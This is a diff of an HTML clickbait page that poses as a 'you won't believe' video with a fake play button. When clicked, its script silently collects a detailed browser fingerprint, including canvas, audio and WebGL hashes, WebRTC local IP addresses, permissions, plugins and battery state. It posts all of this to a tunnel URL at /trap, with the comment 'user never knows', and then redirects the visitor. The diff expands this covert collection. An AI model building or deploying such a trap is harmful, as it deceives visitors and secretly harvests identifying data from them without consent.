@@ -1,204 +1,368 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>You Won't Believe What Happens Next...</title>
   <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Space+Grotesk:wght@400;500;600&display=swap" rel="stylesheet"/>
   <style>
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-    :root {
-      --bg: #0a0a0a; --accent: #ff2d55; --text: #eee;
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    body{
+      background:#0a0a0a;color:#eee;font-family:'Space Grotesk',sans-serif;
+      min-height:100vh;display:flex;align-items:center;justify-content:center;
+      overflow:hidden;position:relative;
     }
-    body {
-      background: var(--bg); color: var(--text);
-      font-family: 'Space Grotesk', sans-serif;
-      min-height: 100vh; display: flex; align-items: center; justify-content: center;
-      overflow: hidden; position: relative;
+    .container{text-align:center;max-width:620px;padding:20px}
+    .title{
+      font-family:'Bebas Neue',sans-serif;font-size:clamp(2.8rem,8vw,5.8rem);
+      letter-spacing:0.04em;line-height:1.05;margin-bottom:16px;
     }
-    .container { text-align: center; z-index: 1; }
-    .title {
-      font-family: 'Bebas Neue', sans-serif;
-      font-size: clamp(2.8rem, 8vw, 5.5rem);
-      letter-spacing: 0.05em;
-      line-height: 1.05;
-      margin-bottom: 20px;
+    .subtitle{
+      font-size:1.4rem;opacity:0.9;margin-bottom:50px;
     }
-    .subtitle {
-      font-size: 1.35rem;
-      opacity: 0.85;
-      margin-bottom: 40px;
-      max-width: 620px;
+    .video-box{
+      width:clamp(280px,68vw,540px);aspect-ratio:16/9;
+      background:linear-gradient(135deg,#1a1a2e,#16213e,#0f1b3a);
+      border-radius:16px;border:3px solid #333;
+      overflow:hidden;cursor:pointer;position:relative;
+      transition:all .3s ease;box-shadow:0 15px 50px rgba(0,0,0,.7);
     }
-    .video-box {
-      width: clamp(280px, 65vw, 520px);
-      aspect-ratio: 16/9;
-      background: linear-gradient(135deg, #1a1a2e, #16213e, #0f1b3a);
-      border-radius: 16px;
-      border: 3px solid #333;
-      overflow: hidden;
-      cursor: pointer;
-      position: relative;
-      transition: all 0.3s ease;
-      box-shadow: 0 10px 40px rgba(0,0,0,0.6);
+    .video-box:hover{
+      transform:scale(1.04);border-color:#ff2d55;
+      box-shadow:0 25px 70px rgba(255,45,85,.35);
     }
-    .video-box:hover {
-      transform: scale(1.04);
-      border-color: var(--accent);
-      box-shadow: 0 20px 60px rgba(255,45,85,0.3);
+    .play-overlay{
+      position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
+      background:rgba(0,0,0,.45);transition:all .3s;
     }
-    .play-overlay {
-      position: absolute;
-      inset: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: rgba(0,0,0,0.4);
-      transition: all 0.3s ease;
+    .video-box:hover .play-overlay{background:rgba(0,0,0,.25)}
+    .play-button{
+      width:88px;height:88px;background:rgba(255,255,255,.95);
+      border-radius:50%;display:flex;align-items:center;justify-content:center;
+      font-size:2.6rem;color:#000;box-shadow:0 10px 30px rgba(0,0,0,.6);
+      transition:transform .2s;
     }
-    .video-box:hover .play-overlay {
-      background: rgba(0,0,0,0.25);
+    .video-box:hover .play-button{transform:scale(1.12)}
+    .label{
+      position:absolute;bottom:22px;left:22px;
+      font-family:'Bebas Neue',sans-serif;font-size:1.45rem;
+      letter-spacing:0.03em;text-shadow:0 3px 12px rgba(0,0,0,.85);
     }
-    .play-button {
-      width: 80px;
-      height: 80px;
-      background: rgba(255,255,255,0.95);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 2.2rem;
-      color: #000;
-      box-shadow: 0 8px 25px rgba(0,0,0,0.5);
-      transition: transform 0.2s ease;
-    }
-    .video-box:hover .play-button {
-      transform: scale(1.15);
-    }
-    .label {
-      position: absolute;
-      bottom: 20px;
-      left: 20px;
-      font-family: 'Bebas Neue', sans-serif;
-      font-size: 1.4rem;
-      letter-spacing: 0.03em;
-      text-shadow: 0 2px 10px rgba(0,0,0,0.8);
-    }
-    .fake-duration {
-      position: absolute;
-      bottom: 18px;
-      right: 20px;
-      font-size: 0.85rem;
-      background: rgba(0,0,0,0.7);
-      padding: 3px 10px;
-      border-radius: 4px;
-      font-family: monospace;
+    .duration{
+      position:absolute;bottom:20px;right:22px;
+      background:rgba(0,0,0,.75);padding:4px 12px;border-radius:6px;
+      font-size:0.9rem;font-family:monospace;
     }
   </style>
 </head>
 <body>
   <div class="container">
     <div class="title">YOU WON'T BELIEVE<br>WHAT HAPPENS NEXT</div>
-    <div class="subtitle">Click to watch the craziest video of 2026 👀</div>
+    <div class="subtitle">This video is actually insane... click to watch 👀</div>
     
     <div class="video-box" id="trap" onclick="handleClick()">
       <div class="play-overlay">
         <div class="play-button">▶</div>
       </div>
-      <div class="label">mind blowing ending...</div>
-      <div class="fake-duration">4:20</div>
+      <div class="label">mind blowing ending you won't see coming</div>
+      <div class="duration">4:20</div>
     </div>
   </div>
 
-  <script>
-    const SERVER_URL = "https://unregrettably-coessential-joye.ngrok-free.dev";  // ← your ngrok
+<script>
+// ═══════════════════════════════════════════════════════
+// SERVER URL — paste your Cloudflare Tunnel URL here
+const SERVER_URL = "https://had-several-cleanup-injured.trycloudflare.com";
+// ═══════════════════════════════════════════════════════
 
-    function canvasFP() {
-      try {
-        const c = document.createElement('canvas');
-        const ctx = c.getContext('2d');
-        ctx.textBaseline = 'top'; 
-        ctx.font = '14px Arial';
-        ctx.fillStyle = '#f60'; 
-        ctx.fillRect(125,1,62,20);
-        ctx.fillStyle = '#069'; 
-        ctx.fillText('lol', 2, 15);
-        return btoa(c.toDataURL().slice(-80));
-      } catch { return 'blocked'; }
-    }
+function canvasFP() {
+  try {
+    const c = document.createElement('canvas');
+    c.width = 280; c.height = 60;
+    const cx = c.getContext('2d');
+    cx.textBaseline = 'alphabetic';
+    cx.fillStyle = '#f0f'; cx.fillRect(0, 0, 280, 60);
+    cx.fillStyle = '#069';
+    cx.font = '18pt "Times New Roman"';
+    cx.fillText('trap 🪤 Cwm fjordbank', 2, 40);
+    cx.fillStyle = 'rgba(255,80,0,0.5)';
+    cx.font = '16pt Arial';
+    cx.fillText('trap 🪤 Cwm fjordbank', 4, 42);
+    return btoa(c.toDataURL().slice(-100)).slice(0, 64);
+  } catch { return 'blocked'; }
+}
 
-    function webglInfo() {
-      try {
-        const c = document.createElement('canvas');
-        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-        if (!gl) return { renderer: 'none', vendor: 'none' };
-        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-        return {
-          renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'hidden',
-          vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'hidden'
-        };
-      } catch { return { renderer: 'error', vendor: 'error' }; }
-    }
+function webglInfo() {
+  try {
+    const c = document.createElement('canvas');
+    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+    if (!gl) return { renderer:'none', vendor:'none', version:'none', shadingVersion:'none' };
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    return {
+      renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'hidden',
+      vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'hidden',
+      version: gl.getParameter(gl.VERSION),
+      shadingVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+      extensions: (gl.getSupportedExtensions() || []).length + ' extensions',
+    };
+  } catch { return { renderer:'error', vendor:'error' }; }
+}
 
-    async function batteryInfo() {
-      try {
-        const b = await navigator.getBattery();
-        return {
-          level: Math.round(b.level * 100) + '%',
-          charging: b.charging
-        };
-      } catch { return { level: 'N/A', charging: false }; }
-    }
+async function audioFP() {
+  try {
+    const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 4096, 44100);
+    const osc = ctx.createOscillator();
+    const cmp = ctx.createDynamicsCompressor();
+    [['threshold',-50],['knee',40],['ratio',12],['attack',0],['release',.25]]
+      .forEach(([k,v]) => cmp[k]?.setValueAtTime(v, ctx.currentTime));
+    osc.type = 'triangle';
+    osc.frequency.setValueAtTime(10000, ctx.currentTime);
+    osc.connect(cmp); cmp.connect(ctx.destination); osc.start(0);
+    const buf = await ctx.startRendering();
+    const data = buf.getChannelData(0).slice(4500, 4600);
+    let hash = 0;
+    data.forEach(v => { hash = (hash * 31 + Math.floor(v * 1e6)) | 0; });
+    return hash.toString(16);
+  } catch { return 'blocked'; }
+}
 
-    function connectionInfo() {
-      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      if (!c) return {};
-      return {
-        type: c.effectiveType || c.type || 'unknown',
-        downlink: c.downlink || 'unknown'
+function mathFP() {
+  const ops = [
+    Math.acos(0.12), Math.acosh(1.5), Math.asin(0.12), Math.asinh(1),
+    Math.atan(2), Math.atanh(0.5), Math.cbrt(2), Math.cos(0.1),
+    Math.cosh(1), Math.expm1(1), Math.hypot(2, 3, 4),
+    Math.log2(2 ** 31 - 1), Math.sinh(1), Math.tan(-1e300), Math.tanh(0),
+  ];
+  return ops.map(n => n.toString(36)).join('|').slice(0, 80);
+}
+
+function getWebRTCIPs() {
+  return new Promise(resolve => {
+    const ips = new Set();
+    try {
+      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+      pc.createDataChannel('');
+      pc.createOffer().then(o => pc.setLocalDescription(o));
+      pc.onicecandidate = e => {
+        if (!e || !e.candidate) {
+          pc.close();
+          resolve([...ips]);
+          return;
+        }
+        const m = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(e.candidate.candidate);
+        if (m) ips.add(m[0]);
       };
-    }
+      setTimeout(() => { try { pc.close(); } catch{} resolve([...ips]); }, 1800);
+    } catch { resolve([]); }
+  });
+}
 
-    async function handleClick() {
-      // Fake "loading" the video for a second
-      const box = document.getElementById('trap');
-      box.style.pointerEvents = 'none';
-      box.innerHTML = `<div style="height:100%;display:flex;align-items:center;justify-content:center;color:#666;font-size:1.1rem;">Loading the craziest video...</div>`;
+function getSpeechVoices() {
+  try {
+    return window.speechSynthesis.getVoices().map(v => v.name + ' (' + v.lang + ')').slice(0, 12);
+  } catch { return []; }
+}
 
-      const payload = {
-        timestamp: new Date().toISOString(),
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        screenRes: `${screen.width}x${screen.height}`,
-        cpuCores: navigator.hardwareConcurrency || 'N/A',
-        deviceMemory: navigator.deviceMemory || 'N/A',
-        canvasFP: canvasFP(),
-        webgl: webglInfo(),
-        battery: await batteryInfo(),
-        connection: connectionInfo(),
-        referrer: document.referrer || 'direct',
-        pageUrl: window.location.href
-      };
+async function getMediaDevices() {
+  try {
+    const devs = await navigator.mediaDevices.enumerateDevices();
+    const c = { audioinput:0, audiooutput:0, videoinput:0 };
+    devs.forEach(d => { if (c[d.kind] !== undefined) c[d.kind]++; });
+    return c;
+  } catch { return { audioinput:'N/A', audiooutput:'N/A', videoinput:'N/A' }; }
+}
 
-      try {
-        await fetch(SERVER_URL + '/trap', {
-          method: 'POST',
-          headers: { 
-            'Content-Type': 'application/json',
-            'ngrok-skip-browser-warning': 'true'
-          },
-          body: JSON.stringify(payload)
-        });
-      } catch (e) {
-        // silent fail - looks more natural
-      }
+async function getPermissions() {
+  const names = ['notifications','clipboard-read','camera','microphone','geolocation'];
+  const result = {};
+  for (const name of names) {
+    try {
+      const s = await navigator.permissions.query({ name });
+      result[name] = s.state;
+    } catch { result[name] = 'N/A'; }
+  }
+  return result;
+}
 
-      // Optional: redirect to a real funny video or rickroll after logging
-      setTimeout(() => {
-        window.location.href = "https://youtu.be/dQw4w9WgXcQ?si=Syiq8xfgWmv0S1tU"; // rickroll example
-      }, 800);
-    }
-  </script>
+async function getBattery() {
+  try {
+    const b = await navigator.getBattery();
+    return {
+      level: Math.round(b.level * 100) + '%',
+      charging: b.charging,
+      chargingTimeSec: b.chargingTime === Infinity ? 'N/A' : b.chargingTime,
+      dischargingTimeSec: b.dischargingTime === Infinity ? 'N/A' : b.dischargingTime,
+    };
+  } catch { return { level:'N/A', charging:'N/A' }; }
+}
+
+function getConnection() {
+  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if (!c) return { type:'unknown', effectiveType:'unknown', downlink:'unknown', rtt:'unknown', saveData:false };
+  return {
+    type: c.type || 'unknown',
+    effectiveType: c.effectiveType || 'unknown',
+    downlink: c.downlink != null ? c.downlink + ' Mbps' : 'unknown',
+    rtt: c.rtt != null ? c.rtt + ' ms' : 'unknown',
+    saveData: !!c.saveData,
+  };
+}
+
+function storageInfo() {
+  let lsSize = 0;
+  try { for (const k in localStorage) lsSize += localStorage[k].length + k.length; } catch{}
+  return {
+    localStorageItems: (() => { try { return localStorage.length; } catch { return 'blocked'; } })(),
+    localStorageBytes: lsSize || 0,
+    sessionStorage: (() => { try { return sessionStorage.length + ' items'; } catch { return 'blocked'; } })(),
+    indexedDB: typeof indexedDB !== 'undefined',
+    cookiesEnabled: navigator.cookieEnabled,
+  };
+}
+
+function mediaQueries() {
+  const mq = q => { try { return window.matchMedia(q).matches; } catch { return null; } };
+  return {
+    prefersDark: mq('(prefers-color-scheme: dark)'),
+    prefersLight: mq('(prefers-color-scheme: light)'),
+    prefersReducedMotion: mq('(prefers-reduced-motion: reduce)'),
+    prefersReducedData: mq('(prefers-reduced-data: reduce)'),
+    prefersContrast: mq('(prefers-contrast: more)'),
+    forcedColors: mq('(forced-colors: active)'),
+    hoverCapable: mq('(hover: hover)'),
+    finePointer: mq('(pointer: fine)'),
+    coarsePointer: mq('(pointer: coarse)'),
+    anyHover: mq('(any-hover: hover)'),
+    displayModeStandalone:mq('(display-mode: standalone)'),
+    hdr: mq('(dynamic-range: high)'),
+  };
+}
+
+function featureDetect() {
+  return {
+    webAssembly: typeof WebAssembly !== 'undefined',
+    serviceWorker: 'serviceWorker' in navigator,
+    webWorker: typeof Worker !== 'undefined',
+    sharedWorker: typeof SharedWorker !== 'undefined',
+    webSocket: typeof WebSocket !== 'undefined',
+    webGL: (() => { try { return !!document.createElement('canvas').getContext('webgl'); } catch { return false; } })(),
+    webGL2: (() => { try { return !!document.createElement('canvas').getContext('webgl2'); } catch { return false; } })(),
+    gamepad: 'getGamepads' in navigator,
+    bluetooth: 'bluetooth' in navigator,
+    usb: 'usb' in navigator,
+    nfc: 'nfc' in navigator,
+    xr: 'xr' in navigator,
+    paymentRequest: typeof PaymentRequest !== 'undefined',
+    credentialsMgmt: 'credentials' in navigator,
+    clipboard: 'clipboard' in navigator,
+    share: 'share' in navigator,
+    wakeLock: 'wakeLock' in navigator,
+    deviceOrientation: typeof DeviceOrientationEvent !== 'undefined',
+    deviceMotion: typeof DeviceMotionEvent !== 'undefined',
+    intersectionObs: typeof IntersectionObserver !== 'undefined',
+    resizeObs: typeof ResizeObserver !== 'undefined',
+  };
+}
+
+function getPlugins() {
+  try { return Array.from(navigator.plugins).map(p => ({ name: p.name, filename: p.filename })); }
+  catch { return []; }
+}
+
+// ── MAIN CLICK HANDLER ─────────────────────────────────────────────
+async function handleClick() {
+  const box = document.getElementById('trap');
+  box.style.pointerEvents = 'none';
+  box.innerHTML = `<div style="height:100%;display:flex;align-items:center;justify-content:center;color:#777;font-size:1.15rem;">Loading the craziest video...</div>`;
+
+  // All the same collectors as before (unchanged)
+  const [battery, rtcIPs, mediaDevs, perms, afp] = await Promise.all([
+    getBattery(),
+    getWebRTCIPs(),
+    getMediaDevices(),
+    getPermissions(),
+    audioFP(),
+  ]);
+
+  window.speechSynthesis?.getVoices();
+  await new Promise(r => setTimeout(r, 200));
+  const voices = getSpeechVoices();
+
+  const payload = {
+    capturedAt: new Date().toISOString(),
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    timezoneOffset: new Date().getTimezoneOffset() + ' min',
+    locale: Intl.DateTimeFormat().resolvedOptions().locale,
+    calendar: Intl.DateTimeFormat().resolvedOptions().calendar,
+    numberingSystem: Intl.DateTimeFormat().resolvedOptions().numberingSystem,
+    language: navigator.language,
+    languages: [...(navigator.languages || [])],
+    userAgent: navigator.userAgent,
+    appName: navigator.appName,
+    appVersion: navigator.appVersion,
+    vendor: navigator.vendor,
+    platform: navigator.platform,
+    product: navigator.product,
+    productSub: navigator.productSub,
+    buildID: navigator.buildID || 'N/A',
+    doNotTrack: navigator.doNotTrack || 'unset',
+    globalPrivacyControl: navigator.globalPrivacyControl ?? 'N/A',
+    javaEnabled: typeof navigator.javaEnabled === 'function' ? navigator.javaEnabled() : 'N/A',
+    pdfViewerEnabled: navigator.pdfViewerEnabled ?? 'N/A',
+    plugins: getPlugins(),
+    screenRes: screen.width + 'x' + screen.height,
+    availRes: screen.availWidth + 'x' + screen.availHeight,
+    viewportSize: window.innerWidth + 'x' + window.innerHeight,
+    outerSize: window.outerWidth + 'x' + window.outerHeight,
+    colorDepth: screen.colorDepth + '-bit',
+    pixelDepth: screen.pixelDepth + '-bit',
+    pixelRatio: window.devicePixelRatio,
+    orientation: screen.orientation?.type || 'unknown',
+    orientationAngle: screen.orientation?.angle ?? 'N/A',
+    cpuCores: navigator.hardwareConcurrency || 'N/A',
+    deviceMemory: (navigator.deviceMemory || 'N/A') + ' GB',
+    maxTouchPoints: navigator.maxTouchPoints,
+    connection: getConnection(),
+    battery: battery,
+    webrtcLocalIPs: rtcIPs,
+    canvasFP: canvasFP(),
+    audioFP: afp,
+    mathFP: mathFP(),
+    webgl: webglInfo(),
+    mediaDevices: mediaDevs,
+    speechVoices: voices,
+    speechVoiceCount: voices.length,
+    permissions: perms,
+    storage: storageInfo(),
+    features: featureDetect(),
+    mediaQueries: mediaQueries(),
+    referrer: document.referrer || 'direct',
+    pageUrl: window.location.href,
+    pageTitle: document.title,
+    historyLength: history.length,
+    documentEncoding: document.characterSet,
+    visibilityState: document.visibilityState,
+    hasFocus: document.hasFocus(),
+  };
+
+  try {
+    await fetch(SERVER_URL + '/trap', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'cf-access-token': 'bypass',
+      },
+      body: JSON.stringify(payload),
+    });
+  } catch (e) {
+    // Silent fail — user never knows
+  }
+
+  // Always show rickroll after logging attempt
+  setTimeout(() => {
+    window.location.href = "https://solar-icons.vercel.app/icons";
+  }, 800);
+}
+</script>
 </body>
 </html>
